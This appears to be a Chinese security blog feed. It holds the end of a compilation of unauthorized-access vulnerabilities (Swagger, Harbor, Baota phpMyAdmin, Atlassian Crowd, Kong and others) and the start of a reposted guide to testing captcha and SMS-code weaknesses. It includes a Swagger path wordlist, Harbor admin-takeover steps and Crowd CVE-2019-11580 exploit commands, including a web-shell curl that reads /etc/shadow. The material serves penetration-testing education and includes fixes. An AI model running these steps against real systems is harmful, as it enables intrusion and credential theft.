<p>Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。</p>
<p><strong>漏洞检测</strong></p>
<p>可利用未授权访问漏洞，直接访问以下链接：</p>
<p><strong>漏洞检测</strong></p>
<p>可利用未授权访问漏洞，直接访问以下链接（目录遍历）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/api
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api-docs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api-docs/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/api-docs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/apidocs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/doc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger-ui
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger-ui.html/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger-ui.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger/ui
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swagger/ui/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swaggerui
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/swaggerui/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/api-docs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/apidocs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/swagger
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/swagger-ui
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/swagger-ui.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v1/swagger/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2/api-docs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2/apidocs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2/swagger
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2/swagger-ui
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2/swagger-ui.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v2/swagger/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/api/v3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/apidocs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/apidocs/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/doc.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/docs/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/druid/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/graphql
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/libs/swaggerui
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/libs/swaggerui/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/spring-security-oauth-resource/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/spring-security-rest/api/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/sw/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-resources
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-resources/configuration/security
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-resources/configuration/security/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-resources/configuration/ui
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-resources/configuration/ui/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-ui
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-ui.html#/api-memory-controller
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-ui.html/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-ui.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger-ui/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger.yml
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger/static/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger/ui/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/Swagger/ui/index
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger/ui/index
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger/v1/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/swagger/v2/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/template/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/user/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/user/swagger-ui.html/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/v1.x/swagger-ui.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/v1/api-docs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/v1/swagger.json
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/v2/api-docs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/v3/api-docs
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>swagger-ui未直接部署在IP根目录下</li>
</ol>
<p>使用burpsuite的插件：APIKit</p>
<p>介绍：<a href="https://www.bilibili.com/read/cv15912732" target="_blank" rel="noopener noreferrer">https://www.bilibili.com/read/cv15912732</a></p>
<p>介绍：https://blog.csdn.net/qq_50854790/article/details/122894291</p>
<p><strong>修复方法</strong></p>
<p>设置访问权限</p>
<h2 id="30-harbor未授权添加管理员漏洞" class="headerLink">
    <a href="#30-harbor%e6%9c%aa%e6%8e%88%e6%9d%83%e6%b7%bb%e5%8a%a0%e7%ae%a1%e7%90%86%e5%91%98%e6%bc%8f%e6%b4%9e" class="header-mark"></a>30. Harbor未授权添加管理员漏洞</h2><p>Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库。</p>
<p><strong>漏洞地址</strong>：<a href="http://10.101.20.111/harbor/sign-in" target="_blank" rel="noopener noreferrer">http://10.101.20.111/harbor/sign-in</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002rW8jG0oifoJ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002rW8jG0oifoJ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002rW8jG0oifoJ.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002ySs2i0ePEal.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002ySs2i0ePEal.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002ySs2i0ePEal.jpg">
        
    </a></p>
<p>成功添加用户，账号coco密码coco1234</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00003fMAUF1375EH.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00003fMAUF1375EH.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00003fMAUF1375EH.jpg">
        
    </a></p>
<p>成功接管harbor镜像仓库</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000ZXUu80BBINg.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000ZXUu80BBINg.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000ZXUu80BBINg.jpg">
        
    </a></p>
<p><strong>安全建议</strong></p>
<p>尽快升级到安全版本，下载链接参考：</p>
<p><a href="https://github.com/goharbor/harbor/releases" target="_blank" rel="noopener noreferrer">https://github.com/goharbor/harbor/releases</a></p>
<h2 id="31-windows-ipc共享未授权访问漏洞" class="headerLink">
    <a href="#31-windows-ipc%e5%85%b1%e4%ba%ab%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>31. Windows ipc共享未授权访问漏洞</h2><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000Lq09C4gUSni.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000Lq09C4gUSni.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000Lq09C4gUSni.jpg">
        
    </a></p>
<h2 id="32-宝塔phpmyadmin未授权访问" class="headerLink">
    <a href="#32-%e5%ae%9d%e5%a1%94phpmyadmin%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>32. 宝塔phpmyadmin未授权访问</h2><p><strong>漏洞简介</strong></p>
<p>宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞</p>
<p>phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>目录扫描：/pma   或者 /phpmyadmin</p>
</li>
<li>
<p>漏洞URL：http://ip:888/pma</p>
</li>
</ol>
<p>即可直接登录（但要求必须安装了phpmyadmin）</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002l4Tog1Abiq4.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002l4Tog1Abiq4.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002l4Tog1Abiq4.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<p>更新宝塔phpmyadmin为最新版本</p>
<h2 id="33-wordpress未授权访问漏洞" class="headerLink">
    <a href="#33-wordpress%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>33. WordPress未授权访问漏洞</h2><p><strong>漏洞复现</strong></p>
<p>可参考 <a href="https://www.cnblogs.com/bflw/p/12342845.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/bflw/p/12342845.html</a></p>
<h2 id="34-atlassian-crowd-未授权访问" class="headerLink">
    <a href="#34-atlassian-crowd-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>34. Atlassian Crowd 未授权访问</h2><p><strong>漏洞简介</strong></p>
<p>Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。</p>
<p>Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。</p>
<p><strong>漏洞检测</strong></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000464noI0b7ICy.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000464noI0b7ICy.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000464noI0b7ICy.jpg">
        
    </a></p>
<p>漏洞利用脚本github地址：https://github.com/jas502n/CVE-2019-11580</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/jas502n/CVE-2019-11580
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cd CVE-2019-11580/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python CVE-2019-11580.py http://192.168.18.138:8095
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>漏洞修复</strong></p>
<p>设置访问/crowd/admin/uploadplugin.action的源ip。</p>
<p>升级最新版本(3.5.0以上)。</p>
<h2 id="35-php-fpm-fastcgi未授权访问漏洞" class="headerLink">
    <a href="#35-php-fpm-fastcgi%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>35. PHP-FPM Fastcgi未授权访问漏洞</h2><p>详情请见：https://www.freebuf.com/articles/web/278245.html（第25条）</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000K0puE413mf7.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000K0puE413mf7.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000K0puE413mf7.jpg">
        
    </a></p>
<h2 id="36-uwsgi未授权访问漏洞" class="headerLink">
    <a href="#36-uwsgi%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>36. uWSGI未授权访问漏洞</h2><p>详情请见：https://www.freebuf.com/articles/web/278245.html （第27条）</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001lV9xE0XNAEG.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001lV9xE0XNAEG.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001lV9xE0XNAEG.jpg">
        
    </a></p>
<h2 id="37-kong未授权访问漏洞cve-2020-11710" class="headerLink">
    <a href="#37-kong%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9ecve-2020-11710" class="header-mark"></a>37. Kong未授权访问漏洞(CVE-2020-11710)</h2><p><strong>环境部署</strong></p>
<p>略。</p>
<p><strong>漏洞复现</strong></p>
<p>复现可参考<a href="https://xz.aliyun.com/t/7631" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/7631</a></p>
<h2 id="38-thinkadminv6未授权访问漏洞" class="headerLink">
    <a href="#38-thinkadminv6%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>38. ThinkAdminV6未授权访问漏洞</h2><p><strong>环境部署</strong></p>
<p>略。</p>
<p><strong>漏洞复现</strong></p>
<p>可参考<a href="https://www.cnblogs.com/cn-gov/p/13715861.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/cn-gov/p/13715861.html</a></p>
<h2 id="归纳补充" class="headerLink">
    <a href="#%e5%bd%92%e7%ba%b3%e8%a1%a5%e5%85%85" class="header-mark"></a>【归纳补充】</h2><p><strong>本人补充：批量检测漏洞思路（史上最经典）</strong></p>
<ul>
<li>批量探测默认端口</li>
<li>对于拼接字符串检测的未授权漏洞，使用自定义字典进行批量目录扫描，查看状态码。对于正常响应的，可以批量进行浏览器访问测试（工具：http://www.ab173.com/zhanzhang/openurls.php）</li>
</ul>
<p>—— 方便开展专项排查工作。</p>
<p>赠人玫瑰手有余香。</p>
<h2 id="参考文章" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="header-mark"></a>参考文章</h2><ol>
<li>二十九种未授权访问漏洞合集，真的很全面</li>
</ol>
<p><a href="https://www.sohu.com/a/551258460_121349997" target="_blank" rel="noopener noreferrer">https://www.sohu.com/a/551258460_121349997</a></p>
<ol start="2">
<li>超全面未授权访问漏洞复现合集 （含：测试环境部署 和 进一步漏洞利用）</li>
</ol>
<p><a href="https://www.freebuf.com/articles/web/278245.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/web/278245.html</a></p>]]></description>
</item><item>
    <title>验证码渗透最全总结</title>
    <link>http://localhost:1313/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/</link>
    <pubDate>Mon, 20 May 2024 17:55:46 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>http://localhost:1313/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2602" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2602</a></em></p>
</blockquote>
<h2 id="验证码渗透最全总结" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e6%b8%97%e9%80%8f%e6%9c%80%e5%85%a8%e6%80%bb%e7%bb%93" class="header-mark"></a>验证码渗透最全总结</h2><p>不少人在碰见验证码的时候，大多数只是看了一眼就过去了，没想到验证码还有啥可测试的。但其实验证码也能在项目中导致<strong>高危</strong>,并且验证码漏洞能在一定情况下造成危害。</p>
<h2 id="验证码总结" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e6%80%bb%e7%bb%93" class="header-mark"></a>验证码总结</h2><p>验证码分为两块内容，一块是图形验证码，一块是短信验证码。下面是对这些技巧总结的思维导图。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002Jsm2H1b9uHF.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002Jsm2H1b9uHF.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002Jsm2H1b9uHF.jpg">
        
    </a></p>
<h3 id="图形验证码" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>图形验证码</h3><h4 id="图形验证码长宽可控" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e9%95%bf%e5%ae%bd%e5%8f%af%e6%8e%a7" class="header-mark"></a>图形验证码长宽可控</h4><p>简单测试方法，就是看到一个登录框，然后新建打开图片链接，在图片链接中就有机会看到两个参数值，一个是 width，一个是 length。这两个参数是计算图片验证码的长宽，如果长宽过高就会过度消耗的是服务器的 CPU 资源。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002ceYyh4aPDjP.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002ceYyh4aPDjP.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002ceYyh4aPDjP.jpg">
        
    </a><br>
当length为比较大的时候，响应时间为2767millis<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000vc3jO1hwF0a.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000vc3jO1hwF0a.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000vc3jO1hwF0a.jpg">
        
    </a><br>
<strong>注意</strong>：该漏洞能造成服务器拒绝服务攻击。有的 SRC 里面注明了，禁止使用 DDOS 攻击，这种漏洞是不收的，如果提交了漏洞，很有可能面临<strong>法律责任</strong>。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000029LAcs2UHiYn.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000029LAcs2UHiYn.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000029LAcs2UHiYn.jpg">
        
    </a></p>
<h4 id="图形验证码可绕过" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e7%bb%95%e8%bf%87" class="header-mark"></a>图形验证码可绕过</h4><p>有时候开发，会写两套图形验证码流程，一套是在生产运行阶段必须使用正确验证码才能通过服务器校验。另外一套是在测试 SIT 环境下，把验证码设置为只要是 null 或者是空都可以登录验证码置为空，提高开发工作效率。还有的时候，将验证码修改为 true 就好了。这个是因为开发在进行图形验证码判断的时候，只要是验证码收到的是 true 就会通过。具体测试过程已经找不到了，大概写一下吧。</p>
<h4 id="图形验证码不失效" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e4%b8%8d%e5%a4%b1%e6%95%88" class="header-mark"></a>图形验证码不失效</h4><p>简单易懂，图形验证码没有对应的失效机制。导致图形验证码能被多次利用。图形验证码在使用后未失效，发送短信时抓包，发送到Repeter中进行重放，可以发送成功!</p>
<h4 id="图形验证码可识别" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e8%af%86%e5%88%ab" class="header-mark"></a>图形验证码可识别</h4><p>这个就是开发在制作图形验证码功能的时候，没有将图形验证码加入足够多的噪点，使验证码能够被现有的工具进行识别。一般是项目硬凑数用的，SRC 全部都不收。具体不做解释</p>
<h4 id="图形验证码随机值可控" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e9%9a%8f%e6%9c%ba%e5%80%bc%e5%8f%af%e6%8e%a7" class="header-mark"></a>图形验证码随机值可控</h4><p>都知道图形验证码是后端随机生成的。那么随机生成的时候，有没有可能是能控制这个随机值？有可能! 生成验证码的随机值被写在了 url 里面<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003w0pU01bKnlM.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003w0pU01bKnlM.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003w0pU01bKnlM.jpg">
        
    </a></p>
<p>将characters固定为aaaa，可以看到图形验证码为aaaa<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003DTu1c2OgVts.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003DTu1c2OgVts.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003DTu1c2OgVts.jpg">
        
    </a></p>
<h4 id="图形验证码返回到前端" class="headerLink">
    <a href="#%e5%9b%be%e5%bd%a2%e9%aa%8c%e8%af%81%e7%a0%81%e8%bf%94%e5%9b%9e%e5%88%b0%e5%89%8d%e7%ab%af" class="header-mark"></a>图形验证码返回到前端</h4><p>测试过程已经找不到了，口头描述下大致就是登录后会在响应包中返回了下次图形验证码的内容。</p>
<h3 id="短信验证码" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>短信验证码</h3><p>我们已经写完了图形验证码部分，现实情况下短信验证码也是比较多。短信验证码的漏洞技巧要比图形验证码<strong>多很多</strong></p>
<h4 id="短信炸弹纵向" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%ba%b5%e5%90%91" class="header-mark"></a>短信炸弹纵向</h4><p>在一个限制时间的情况下对一个手机号，发送的短信验证码条数超过发送预期，这种漏洞我们都称为<code>短信炸弹</code>or<code>短信轰炸</code>or<code>短信炸弹纵向</code><br>
